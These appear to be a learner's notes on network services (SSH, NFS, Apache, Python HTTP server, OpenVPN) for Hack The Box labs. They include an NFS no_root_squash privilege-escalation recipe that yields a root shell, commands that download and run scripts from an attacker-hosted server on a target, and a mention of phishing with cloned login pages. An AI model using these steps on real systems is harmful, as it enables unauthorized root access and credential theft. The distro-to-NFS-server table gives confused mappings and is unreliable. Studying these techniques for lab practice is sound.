# Network Services

## SSH — Secure Shell
```bash
sudo apt install openssh-server -y       # install
systemctl status ssh                      # check status
ssh user@ip                               # connect
```

### Config File
/etc/ssh/sshd_config

```bash
grep -v "#" /etc/ssh/sshd_config | grep -v "^$"    # active config, no comments/blank lines
```

> Gives you a TERMINAL/SHELL on remote machine — you type commands that execute there
> Requires valid credentials

### Security Notes
PermitRootLogin yes      → root can SSH directly — bad practice, common finding
PasswordAuthentication   → check if password login is even allowed

---

## NFS — Network File System

### Mental Model
Share a folder on Computer A so Computer B can access it
AS IF it's sitting on Computer B's own hard drive — no commands needed, just live file access

> Different from SSH — no terminal, no commands run remotely
> Their folder appears DIRECTLY inside your file system
> Can require NO authentication if misconfigured — bigger risk than SSH

### Install (Server Side)
```bash
sudo apt install nfs-kernel-server -y
systemctl status nfs-kernel-server
```

### Config File — /etc/exports
```bash
echo '/home/user/share hostname(rw,sync,no_root_squash)' >> /etc/exports
```

Breaking down the line:
/home/user/share     ← folder being shared
hostname             ← who can connect (IP, *, or subnet)
(rw,sync,no_root_squash) ← rules for that access

### Permission Options
| Option | Meaning |
|--------|---------|
| rw | read and write |
| ro | read only |
| sync | confirm write before continuing — safer, slower |
| async | don't wait for confirmation — faster, riskier |
| no_root_squash | client's root stays root on the share — DANGEROUS |
| root_squash | client's root gets downgraded to normal user — DEFAULT/SAFE |

### Mounting (Client Side)
```bash
mkdir ~/target_nfs
mount target-ip:/home/john/dev_scripts ~/target_nfs
ls ~/target_nfs        # browse their files like local
```

### Privilege Escalation via no_root_squash
```bash
# Step 1 — mount their share
mkdir ~/target_nfs
mount target-ip:/shared/folder ~/target_nfs

# Step 2 — you're root locally, create malicious SUID binary
cp /bin/bash ~/target_nfs/bash
chmod +s ~/target_nfs/bash

# Step 3 — SUID sticks because share trusts your root status

# Step 4 — execute ON the target (via existing access)
./bash -p          # -p preserves privileges, drops into root shell
```

---

## SSH vs NFS — Key Difference
| | SSH | NFS |
|---|-----|-----|
| What you get | Terminal/shell on their machine | Their folder mounted into your filesystem |
| Interaction | Commands run remotely | Normal file browsing locally |
| Auth required | Always | Can be NONE if misconfigured |
| Use case | Run commands, manage system | Share files like a network drive |

---

## Web Servers

### Apache
```bash
sudo apt install apache2 -y
```

Config file: /etc/apache2/apache2.conf
Default web root: /var/www/html

### Apache Directory Block
```apache
<Directory /var/www/html>
    Options Indexes FollowSymLinks
    AllowOverride All
    Require all granted
</Directory>
```

Breaking it down:
<Directory /var/www/html>   → rules apply ONLY to this folder
Options Indexes             → show file list if no index.html exists
FollowSymLinks               → follow symbolic links inside this folder
AllowOverride All           → allow .htaccess to override these settings
Require all granted         → everyone can access, no login needed

### .htaccess
Per-directory config file — override settings without touching main config

### Why It Matters for Pentesting
```bash
cp exploit.sh /var/www/html/
# now anyone can download it
wget http://your-ip/exploit.sh
```

---

### Python Web Server — Quick File Transfer
```bash
python3 -m http.server                                # current dir, port 8000
python3 -m http.server 443                            # custom port
python3 -m http.server --directory /path/to/folder    # specific folder
```

### Real Pentest Workflow
```bash
# attack machine — host tools
python3 -m http.server 8000

# target machine — download
wget http://your-ip:8000/linpeas.sh
curl http://your-ip:8000/exploit.sh -o exploit.sh
```

---

## VPN

### Mental Model
A secure tunnel connecting you to a remote network — once connected,
your machine acts like it's PHYSICALLY INSIDE that network
This is exactly what HTB's VPN does

### OpenVPN — Server Side (rarely set up yourself)
```bash
sudo apt install openvpn -y
```
Config: /etc/openvpn/server.conf

### OpenVPN — Client Side (what you actually use)
You get a .ovpn file containing server address, certificates, settings

```bash
sudo openvpn --config internal.ovpn
```

Breaking it down:
sudo            → needs root to create network tunnel
openvpn         → the program
--config        → flag: "use this config file"
internal.ovpn   → the file you were given

> This is EXACTLY what you do with HTB's VPN file
> sudo openvpn --config htb_lab.ovpn
> After this — target IPs become reachable

---

## Quick Reference Table
| Service | Port | Config File | Use Case |
|---------|------|-------------|----------|
| SSH | 22 | /etc/ssh/sshd_config | remote terminal access |
| NFS | 2049 | /etc/exports | file sharing, privesc via no_root_squash |
| Apache | 80/443 | /etc/apache2/apache2.conf | web hosting |
| Python HTTP | 8000 (custom) | none | quick file transfer |
| OpenVPN | 1194 | /etc/openvpn/server.conf | network tunneling |

---

## Real Pentest Workflow Example

```bash
# 1. Connect to target network via VPN
sudo openvpn --config htb_lab.ovpn

# 2. SSH into a compromised box
ssh user@target-ip

# 3. Attack machine — host privesc tools
python3 -m http.server 8000

# 4. Target — download and run
wget http://your-ip:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# 5. Check for NFS misconfig
cat /etc/exports 2>/dev/null
showmount -e target-ip
# if no_root_squash found — exploit it
```

## Additional Notes

### NFS Server Implementations by Distro
| Distro | NFS Server |
|--------|-----------|
| Ubuntu | NFS-UTILS |
| Solaris | NFS-Ganesha |
| Red Hat | OpenNFS |

### tree — Visualize Folder Structure
```bash
tree ~/target_nfs
```
Shows a clean visual tree of files/folders — useful after mounting NFS shares.

### Apache Useful Modules
| Module | Purpose |
|--------|---------|
| mod_rewrite | URL rewriting |
| mod_security | web application firewall |
| mod_ssl | HTTPS/SSL support |

### Web Servers — Phishing Use Case
Pentesters can host CLONED/fake versions of target login pages
to capture credentials when users unknowingly enter them
> Beyond file hosting — web servers are also a phishing delivery method

### Other VPN Protocols (besides OpenVPN)
| Protocol | Notes |
|----------|-------|
| L2TP/IPsec | common enterprise VPN |
| PPTP | older, considered weak/insecure |
| SSTP | Microsoft proprietary |
| SoftEther | multi-protocol VPN server |

### Why Protocol Security Awareness Matters
Original example: a user connects via UNENCRYPTED FTP — credentials
captured in plain text by sniffing network traffic.
> Lesson: always check if a service encrypts traffic before trusting it
> FTP = plaintext, SFTP/FTPS = encrypted alternatives

Previous:
[[Day -10 Task Scheduling]]

Next:
[[Day -12 Working with Web Services]]